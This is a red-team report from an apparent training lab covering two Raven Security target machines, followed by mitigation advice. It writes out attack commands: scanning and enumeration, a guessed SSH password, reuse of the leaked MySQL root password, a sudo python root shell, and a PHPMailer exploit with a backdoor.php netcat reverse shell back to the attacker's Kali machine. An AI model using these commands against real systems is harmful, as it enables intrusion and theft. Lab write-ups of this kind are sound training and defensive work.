# Offensive Report (Red-Team): Summary of Operations

### Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services
Nmap scan results for each machine reveal the below services and OS details:

Command: `$ nmap -sV 192.168.1.110`

Output Screenshot:

![Nmap scan results](/Images/nmap-scan-results.png "Nmap scan results")

This scan identifies the services below as potential points of entry:

**Target 1**
1. Port 22/TCP 	    Open 	SSH
2. Port 80/TCP 	    Open 	HTTP
3. Port 111/TCP 	Open 	rcpbind
4. Port 139/TCP 	Open 	netbios-ssn
5. Port 445/TCP 	Open 	netbios-ssn

### Critical Vulnerabilities
The following vulnerabilities were identified on each target:

**Target 1**
1. User Enumeration (WordPress site)
2. Weak User Password
3. Unsalted User Password Hash (WordPress database)
4. Misconfiguration of User Privileges/Privilege Escalation

### Explotation
The Red Team was able to penetrate Target 1 and retrieve the following confidential data:

**Target 1**
- **Flag1: b9bbcb33ellb80be759c4e844862482d**
- Exploit Used:
    - WPScan to enumerate users of the Target 1 WordPress site
    - Command: 
        - `$ wpscan --url http://192.168.1.110 --enumerate u`

![WPScan results](/Images/wp-scan-users.png "WPScan results")

- Targeting user Michael
    - Small manual Brute Force attack to guess/finds Michael’s password
    - User password was weak and obvious
    - Password: michael
- Capturing Flag 1: SSH in as Michael traversing through directories and files.
    - Flag 1 found in var/www/html folder at root in service.html in a HTML comment below the footer.
    - Commands:
        - `ssh michael@192.168.1.110`
        - `pw: michael`
        - `cd ../`
        - `cd ../`
        - `cd var/www/html`
        - `ls -l`
        - `nano service.html`

![Flag 1 location](/Images/flag1-location.png "Flag 1 location")

- **Flag2: fc3fd58dcdad9ab23faca6e9a3e581c**
- Exploit Used:
    - Same exploit used to gain Flag 1.
    - Capturing Flag 2: While SSH in as user Michael Flag 2 was also found.
        - Once again traversing through directories and files as before Flag 2 was found in /var/www next to the html folder that held Flag 1.
        - Commands:
            - `ssh michael@192.168.1.110` 
            - `pw: michael`
            - `cd ../` 
            - `cd ../`
            - `cd var/www`
            - `ls -l`
            - `cat flag2.txt`

![Flag 2 location](/Images/flag2-location.png "Flag 2 location")

![Flag 2 cat](/Images/flag2-cat.png "Flag 2 cat")

- **Flag3: afc01ab56b50591e7dccf93122770cd2**
- Exploit Used:
    - Same exploits used to gain Flag 1 and 2.
    - Capturing Flag 3: Accessing MySQL database.
        - Once having found wp-config.php and gaining access to the database credentials as Michael, MySQL was used to explore the database.
        - Flag 3 was found in wp_posts table in the wordpress database.
        - Commands:
            - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
            - `show databases;`
            - `use wordpress;` 
            - `show tables;`
            - `select * from wp_posts;`

![Flag 3 location](/Images/flag3-location.png "Flag 3 location")

- **Flag4: 715dea6c055b9fe3337544932f2941ce**
- Exploit Used:
    - Unsalted password hash and the use of privilege escalation with Python.
    - Capturing Flag 4: Retrieve user credentials from database, crack password hash with John the Ripper and use Python to gain root privileges.
        - Once having gained access to the database credentials as Michael from the wp-config.php file, lifting username and password hashes using MySQL was next. 
        - These user credentials are stored in the wp_users table of the wordpress database. The usernames and password hashes were copied/saved to the Kali machine in a file called wp_hashes.txt.
            - Commands:
                - `mysql -u root -p’R@v3nSecurity’ -h 127.0.0.1` 
                - `show databases;`
                - `use wordpress;` 
                - `show tables;`
                - `select * from wp_users;`

        - ![wp_users table](/Images/wpusers-table.png "wp_users table")

        - On the Kali local machine the wp_hashes.txt was run against John the Ripper to crack the hashes. 
            - Command:
                - `john wp_hashes.txt`

        - ![John the Ripper results](/Images/john-results.png "John the Ripper results")

        - Once Steven’s password hash was cracked, the next thing to do was SSH as Steven. Then as Steven checking for privilege and escalating to root with Python
            - Commands: 
                - `ssh steven@192.168.1.110`
                - `pw:pink84`
                - `sudo -l`
                - `sudo python -c ‘import pty;pty.spawn(“/bin/bash”)’`
                - `cd /root`
                - `ls`
                - `cat flag4.txt`

![Flag 4 location](/Images/flag4-location.png "Flag 4 location")



## Target 2 Engagement ##

Scanned target using nmap.

```
nmap -sV -O 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_nmap.JPG "nmap results")

Target 2 looks identical to Target 1. Target 2 has multiple ports open with services running.

| Port | Service Version |
| :---: | :---: |
| 22 | OpenSSH 6.7p1 Debian |
| 80 | Apache httpd 2.4.10 |
| 111 | rpcbind 2-4 |
| 139 | Netbios Samba 3.x-4.x |
| 445 | Netbios Samba 3.x-4.x |

Used nikto for further enumeration of the site.

```
nikto -C all -h 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_nikto.JPG "nikto results")

nikto shows multiple hidden subdomains. After inspecting the subdomains, decided to use gobuster for further enumeration.

```
gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_gobuster.JPG "gobuster results")

gobuster revealed more subdomains. The vendor subdomain is intriguing, so shall start with that. Inspected `http://192.168.1.115/vendor` and found a list of files and directories.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_vendor_dir.JPG "vendor directory")

Started looking through the directory. Found interesting items in the sub directories, and noticed PATH had the newest timestamp. Found Flag 1 inside the PATH file.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag1_CLEAN.JPG "Flag 1")

Searched around more & discovered a file referring to specific security vulnerabilities to this version of PHPMailer. Confirmed version of PHPMailer is vulnerable to a RCE exploit listed using searchsploit. The team found and modified an exploit to the vulnerability.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2-exploit.JPG "Bash Exploit Script")

Ran the exploit. Tested operation of the exploit, then set up a listener on the Kali and used the exploit to have Target 2 call my Kali. Exported a proper shell using python.

```
bash exploit.sh
nc -vnlp 1234
192.168.1.115/backdoor.php?cmd=nc 192.168.1.90 1234 -e /bin/bash
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=linux
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_reverse_shell.JPG "Exploit Reverse Shell Command")

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_shell.JPG "Getting the Shell!")

Took stock of what we had. Found Flag 2 in the /var/www directory.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag2_CLEAN.JPG "Flag 2")

And found the location of Flag 3. Had to return to the web browser to read it out.

```
192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag3_CLEAN.jpg "Flag 3")

Found 3 of the 4 target flags. Having found no sign of the 4th flag, the focus now turned to privilege escalation. Attempted to just switch to the root account. Was prompted for a password and unbelievably was able to guess the exact password. The root password was as easy, if not easier, than guessing user michael's password from Target 1.

```
su root
```

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_su_root_clean.JPG "Switch to Root")

And with that, it was easy to capture Flag 4.

![alt text](https://github.com/ExtonHoward/Raven_Security_project/blob/main/Screenshots/Target2/T2_flag4_clean.JPG "Flag 4")

After guessing the root user password, went to check Target 1 & found the root user on Target 1 had the same password.


## Vulnerabilities and Mitigation ##
Several vulnerabilities were discovered during the completion of this engagement. Target 1 has numerous critical vulnerabilities that should be addressed immediately.

### Ports Exposed to the Internet ###
The team discovered that multiple ports on Target 1 and Target 2 that should not have been exposed were exposed to the internet.

Mitigation
* Minimize ports exposed to the internet.
* Set strict alarms to alert your SOC on any ports exposed to the internet.
* Set an alarm to notify the SOC if more than 25 ports aside from 80 and 443 are scanned in under 5 minutes.
* Apply a firewall rule to default-deny all non-whitelisted IP addresses to accessing ports other than port 80 or 443.
* If ports other than 80 or 443 must be exposed, enable TCP wrapping and firewall rules that auto-deny any IP that is not specifically whitelisted.
* Apply firewall rules to deny ICMP requests and not send responses.

### Sensitive Data Exposure ###
During the engagement, the team found Target 1 has a flag exposed on the Wordpress website in the page source code for the service page. This was easily discoverable. Target 2 also had a flag exposed as well as a list of vulnerabilities on that exact version of PHPMailer.

Mitigation
* Remove flag from the source code.
* Remove any file or directory that should not be accessed by the public.

### Security Misconfiguration: Brute Force Vulnerability ###
The team found the users of the Target 1 web server did not have account lockouts active for excessive failed lockout attempts.

Mitigation
* Set an alarm to notify the SOC if more than 10 HTTP 401 response codes are on the same account in under 10 minutes.
* Set a user policy that locks out the account for 30 minutes after 10 failed login attempts.
* Enable 2-factor authentication on all accounts.
* Enable a random 1-3 second delay on password validation to slow down any brute force attacks.
* If more than 20 failed login attempts from the same IP address occur sitewide within 10 minutes, blacklist that IP until it can be reviewed.

### Outdated Software Version ###
The team discovered an older version of Wordpress on Target 1 with many known vulnerabilities. The team also discovered an exploitable version of PHPMailer on Target 2.

Mitigation
* Update Wordpress to the latest version (as of the time of this report, that is version 5.7.1).
* Update PHPMailer to the latest version (as of the time of this report, that is version 6.3.0).

### Unsalted Hashed Passwords ###
The team obtained a password hash during the engagement. An open source tool was able to quickly break the hash and allowed the team to gain login credentials for a privileged account on Target 1. Target 2's password hashes were salted.

Mitigation
* Restrict files with password hashes to admin level accounts.
* Do not have any files that contain password hashes exposed to the internet.
* Salt all password hashes.

### Weak Passwords ###
The team found that the passwords on Target 1 that they were able to Brute Force and the hashed passwords that they were able to crack were short and not complex.

Mitigation
* Require all passwords to contain a minimum of 10 characters.
* Require all passwords to contain at minimum 1 capital letter.
* Require all passwords to contain at minimum 1 special character (!, %, *, etc).
* Require all passwords not be commonly used words, employees names, company names, or in the dictionary.

### MySQL Running as Root ###
Found MySQL database on both Target 1 & Target 2 running with root credentials. This is not necessary as MySQL can be run as any user.

Mitigation
* Remove Root credentials from the wp-config.php file.
* Create a different user to be the default user to the MySQL database.

### Root Password easily guessed ###
Target 1 and Target 2 had an unbelievably easy password on the root account allowing it to be guessed. Both web servers used the same, easily guessed password for the root account.

Mitigation
* Change the root password to a long and complex password.

## Conclusion ##

Target 1 had many substantial vulnerabilities. The quickest methods to increase the security of Target 1 is to update to the latest version of Wordpress, close extra ports, and apply account lockouts. Target 2 was better protected but still allowed a backdoor and an easily guessed root user password. Change the password on the root account and update Wordpress to the latest version. Also, on both Target 1 & 2, create & use a non-privileged account for the MySQL database.
